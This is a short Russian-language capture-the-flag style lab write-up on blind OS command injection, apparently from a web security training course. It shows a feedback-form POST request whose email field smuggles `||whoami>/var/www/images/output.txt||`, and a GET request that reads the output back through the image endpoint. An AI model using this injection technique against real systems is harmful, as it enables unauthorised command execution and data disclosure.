# Лабораторная работа: Слепое внедрение команд ОС с перенаправлением вывода.

В данной лабораторной работе обнаружена уязвимость, позволяющая осуществлять слепое внедрение команд операционной системы в функцию обратной связи.

Приложение выполняет команду оболочки, содержащую предоставленные пользователем данные. Вывод команды не возвращается в ответе. Однако вы можете использовать перенаправление вывода, чтобы перехватить вывод команды. Доступна для записи папка по адресу:

`/var/www/images/`

Приложение загружает изображения для каталога продукции из этого места. Вы можете перенаправить вывод внедренной команды в файл в этой папке, а затем использовать URL-адрес загрузки изображения для получения содержимого файла.

Для решения лабораторной работы выполните `whoami` команду и получите результат.

---

**Ход работы:**

Начинаем анализировать:

В POST-запросе:

`csrf=kffvk4sZ98tCSbMVZ88gqq6qB9n1BsUp&name=Mcgregor&email=mcgregor%40tresh.com||whoami>/var/www/images/output.txt||&subject=NO&message=Floyd+mayweather%0A`

выполняю команду записи в файл, которая записывает в директории images, после чего иду на изображение (GET-запрос):

меняю `GET /image?filename=38.jpg HTTP/1.1` на `GET /image?filename=output.txt HTTP/2` результат:

Успех, вижу содержимое в ответе!
